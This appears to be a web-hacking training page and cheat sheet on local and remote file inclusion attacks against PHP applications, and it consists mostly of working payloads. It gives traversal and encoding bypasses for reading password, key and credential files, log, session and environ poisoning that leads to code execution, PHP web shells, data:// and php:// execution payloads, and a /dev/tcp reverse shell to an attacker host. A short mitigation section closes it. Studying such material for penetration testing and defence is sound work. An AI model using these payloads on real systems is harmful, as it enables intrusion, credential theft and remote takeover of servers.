---
layout: training-page
title: "File Inclusion Attacks (LFI / RFI) — Red Team Academy"
module: "Web Hacking"
tags:
  - lfi
  - rfi
  - file-inclusion
  - path-traversal
  - web-hacking
page_key: "web-file-inclusion"
render_with_liquid: false
---

# File Inclusion Attacks (LFI / RFI)

File inclusion vulnerabilities occur when user-supplied input is passed to a file-loading function (PHP's `include()`, `require()`, etc.) without proper validation. The result ranges from reading sensitive server files (LFI) to executing attacker-controlled code (RFI and LFI-to-RCE). These vulnerabilities remain prevalent in PHP applications and any language where file paths are constructed from user input.

## Local File Inclusion (LFI)

LFI allows reading files already present on the server. The attacker cannot supply a remote file — only reference local paths.

### Basic Detection

```
# Look for parameters loading file content:
# ?page=home
# ?file=header
# ?template=default
# ?lang=en
# ?include=menu

# Test by substituting a known local path:
http://target.com/index.php?page=/etc/passwd
http://target.com/index.php?page=../../../../etc/passwd
http://target.com/index.php?file=../../../etc/shadow
```

### Path Traversal to LFI

```
# Basic traversal (escape the intended directory):
?page=../../../../etc/passwd

# URL-encoded traversal (bypass simple filters):
?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd

# Double URL encoding:
?page=..%252F..%252F..%252Fetc%252Fpasswd

# Null byte termination (bypass .php extension appending — PHP < 5.3):
?page=../../../../etc/passwd%00

# PHP filter bypass (if extension is appended):
?page=....//....//....//etc/passwd    # Double-dot slash

# Absolute path (if no prefix is prepended):
?page=/etc/passwd
```

### High-Value Local Files to Read

```
# Linux:
/etc/passwd                    # User accounts (crack password hashes)
/etc/shadow                    # Hashed passwords (requires root read)
/etc/hosts                     # Internal hostnames
/etc/crontab                   # Scheduled tasks
/etc/ssh/sshd_config           # SSH configuration
/home/USER/.ssh/id_rsa         # SSH private keys
/home/USER/.bash_history       # Command history
/proc/self/environ             # Environment variables (may contain credentials)
/proc/self/cmdline             # Process command line
/var/log/apache2/access.log    # Apache access log (log poisoning)
/var/log/nginx/access.log      # Nginx access log
/var/log/auth.log              # Auth attempts
/var/www/html/config.php       # App config (database credentials)
/var/www/html/.env             # Laravel/modern app credentials

# Windows:
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config  # IIS config (may contain DB creds)
C:\xampp\apache\conf\httpd.conf
C:\xampp\phpMyAdmin\config.inc.php  # phpMyAdmin credentials
```

### PHP Filter — Read PHP Source Code

```
# PHP filter wrapper allows reading PHP file contents as base64
# (prevents PHP from executing the code, returns raw source)

# Read /var/www/html/config.php:
?page=php://filter/convert.base64-encode/resource=config.php

# Decode the output:
echo "BASE64_OUTPUT" | base64 -d

# Read index.php source:
?page=php://filter/convert.base64-encode/resource=index.php

# Read files outside webroot:
?page=php://filter/convert.base64-encode/resource=../../../etc/passwd

# Chain filters (useful for bypassing some WAFs):
?page=php://filter/read=string.toupper|string.rot13/resource=config.php
```

## LFI to Remote Code Execution

### Log Poisoning

```
# Inject PHP code into a log file, then include that log file

# Step 1: Inject PHP code via User-Agent header:
curl -s "http://target.com/" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Or inject via username in SSH login attempts:
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 2: Include the log file to execute the injected code:
?page=../../../../var/log/apache2/access.log&cmd=id

# Common log locations:
# Apache: /var/log/apache2/access.log
# Nginx:  /var/log/nginx/access.log
# SSH:    /var/log/auth.log
# Mail:   /var/log/mail.log
```

### /proc/self/environ Poisoning

```
# The /proc/self/environ file contains environment variables including HTTP_USER_AGENT

# Step 1: Send request with PHP payload in User-Agent:
curl "http://target.com/" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Step 2: Include /proc/self/environ:
?page=../../../../proc/self/environ&cmd=id

# Note: requires read access to /proc/self/environ (not always accessible)
```

### PHP Session File Inclusion

```
# PHP stores session data in files — if you control session content, include the session file

# Step 1: Set a session cookie containing PHP code:
curl "http://target.com/page.php?page=home" \
  -H 'Cookie: PHPSESSID=YOURSESSID' \
  -d 'username=<?php system($_GET["cmd"]); ?>'

# Step 2: Include the session file:
?page=../../../../tmp/sess_YOURSESSID&cmd=id

# PHP session files stored at:
# /var/lib/php/sessions/sess_SESSIONID
# /tmp/sess_SESSIONID
```

## Remote File Inclusion (RFI)

RFI allows including files from a remote server. The attacker hosts a PHP file and the target server fetches and executes it. Requires `allow_url_include = On` in PHP configuration (disabled by default in PHP 5.2+).

```
# Check if RFI is possible:
?page=http://attacker.com/test.txt
?page=https://attacker.com/phpinfo.php

# Host a PHP webshell on your server:
# webshell.php:
# <?php system($_GET['cmd']); ?>

# Serve it:
python3 -m http.server 8080

# Include the remote shell:
?page=http://ATTACKER_IP:8080/webshell.php&cmd=id

# Get a reverse shell (using RFI):
# shell.php:
# <?php exec("/bin/bash -c 'bash -i >/dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>

?page=http://ATTACKER_IP:8080/shell.php
```

## PHP Wrapper Techniques

```
# data:// wrapper (RFI alternative, no remote server needed):
?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id

# URL encoded:
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id

# Encode payload:
echo '<?php system($_GET["cmd"]); ?>' | base64

# zip:// wrapper (if you can upload a zip file):
?page=zip://uploads/payload.zip%23shell.php&cmd=id

# phar:// wrapper (if you can upload a phar archive):
?page=phar://uploads/payload.phar/shell.php&cmd=id
```

## Bypassing Filters

```
# When basic traversal is filtered, try:

# 1. Double encoding:
?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 2. Unicode encoding:
?page=..%c0%af..%c0%afetc%c0%afpasswd
?page=..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd

# 3. Mixed slash directions (Windows):
?page=..\../etc/passwd

# 4. Excessive traversal (overshoot and rely on OS normalization):
?page=../../../../../../../../../../../../etc/passwd

# 5. Start from /proc/self to get absolute path:
?page=/proc/self/cwd/../../../etc/passwd

# 6. Bypass extension appending (e.g., code appends .php):
# Null byte (%00): older PHP only
?page=../../../../etc/passwd%00
# Path truncation (very long path before sensitive file)
```

## Detection Checklist

```
# Parameters to test for file inclusion:
page, file, template, include, lang, language, dir, path, document,
folder, root, cat, pg, style, pdf, layout, conf, module, content,
resource, inc, view, url, load, data, feed, config

# Quick scan with ffuf:
ffuf -u "http://target.com/index.php?FUZZ=../../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fr "file not found" -mc 200

# Test once parameter found:
ffuf -u "http://target.com/index.php?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fw 1
```

## LFI Wordlists

```
# SecLists LFI wordlists:
ls /usr/share/seclists/Fuzzing/LFI/

# LFI-Jhaddix.txt     — comprehensive LFI paths
# LFI-gracefulsecurity-linux.txt  — Linux-specific paths
# LFI-gracefulsecurity-windows.txt — Windows-specific paths

# Typical payload list includes:
# ../../../../etc/passwd
# ../../../../etc/hosts
# ../../../proc/self/environ
# php://filter/convert.base64-encode/resource=index
# data://text/plain;base64,...
```

## Mitigation (For Reference)

```
# Secure coding practices:
# 1. Never pass user input directly to include/require functions
# 2. Use a whitelist of allowed files:
#    $allowed = ['home', 'about', 'contact'];
#    if (!in_array($page, $allowed)) die("Invalid page");
# 3. Ensure allow_url_include = Off in php.ini
# 4. Ensure allow_url_fopen = Off if not needed
# 5. Restrict file system access via open_basedir
# 6. Validate against absolute paths (realpath() check)

# Detection signatures:
# ../../ in URL parameters → path traversal attempt
# php://filter in parameters → PHP filter attack
# /etc/passwd, /etc/shadow in requests → LFI attempt
# Remote URLs in file parameters → RFI attempt
```

## LFI Payload Library

Additional traversal and encoding payloads from PayloadsAllTheThings not already covered above.

### Path Traversal Variants

```
# Basic traversal:
../../../etc/passwd

# UTF-8 encoding bypass:
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

# Path truncation (overflow the filename buffer — PHP <= 5.3):
../../../etc/passwd............[ADD 4000+ chars]
../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
../../../etc/passwd/./././././.[ADD MORE]

# Filter bypass via double traversal:
....//....//etc/passwd           # double dot-slash
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

# Absolute path (no prefix):
/etc/passwd

# Relative path from /proc/self:
/proc/self/cwd/../../../etc/passwd
```

### Remote File Inclusion Bypass

```
# When allow_url_include = On (rare but exists):
http://example.com/index.php?page=http://evil.com/shell.txt

# Null byte in RFI:
http://example.com/index.php?page=http://evil.com/shell.txt%00

# Double encoding in RFI URL:
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt

# bypass allow_url_include restriction via SMB (Windows):
http://example.com/index.php?page=\\attacker.com\share\shell.php

# data:// wrapper as local RFI alternative:
?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

## PHP Wrappers Reference

PHP wrapper cheatsheet from PayloadsAllTheThings — full list of usable wrappers in LFI context.

```
# php://filter — read source code as base64 (prevents execution):
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=../../etc/passwd
?page=php://filter/read=string.toupper|string.rot13/resource=config.php  # WAF bypass chaining

# php://input — execute POST body as PHP (requires allow_url_include=On):
?page=php://input
# POST body: <?php system($_GET['cmd']); ?>

# data:// — inline code execution:
?page=data://text/plain,<?php phpinfo(); ?>
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

# zip:// — execute PHP inside a ZIP archive:
# 1. Create zip with PHP file inside: zip payload.zip shell.php
# 2. Upload the zip
?page=zip://uploads/payload.zip%23shell.php&cmd=id

# phar:// — PHP archive wrapper:
# 1. Create phar archive with PHP stub
# 2. Upload
?page=phar://uploads/payload.phar/shell.php&cmd=id

# expect:// — execute commands (requires expect extension):
?page=expect://id

# /proc/self/fd/ — file descriptor via LFI:
?page=/proc/self/fd/0     # stdin
?page=/proc/self/fd/1     # stdout
?page=/proc/self/fd/2     # stderr

# Combine with log poisoning:
# 1. Poison /proc/self/fd/N (N = open file descriptor for access log)
# 2. Include: ?page=/proc/self/fd/N&cmd=id

# LFI tools:
# LFISuite — automatic LFI exploitation: github.com/D35m0nd142/LFISuite
# LFImap — LFI discovery: github.com/hansmach1ne/LFImap
# Panoptic — automated path traversal: github.com/lightos/Panoptic
```

## Resources

- Hacker101 — File Inclusion Bugs session
- PortSwigger — File path traversal — `portswigger.net/web-security/file-path-traversal`
- SecLists LFI wordlists — `/usr/share/seclists/Fuzzing/LFI/`
- PayloadsAllTheThings LFI — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion`
- HackTricks LFI — `book.hacktricks.xyz/pentesting-web/file-inclusion`
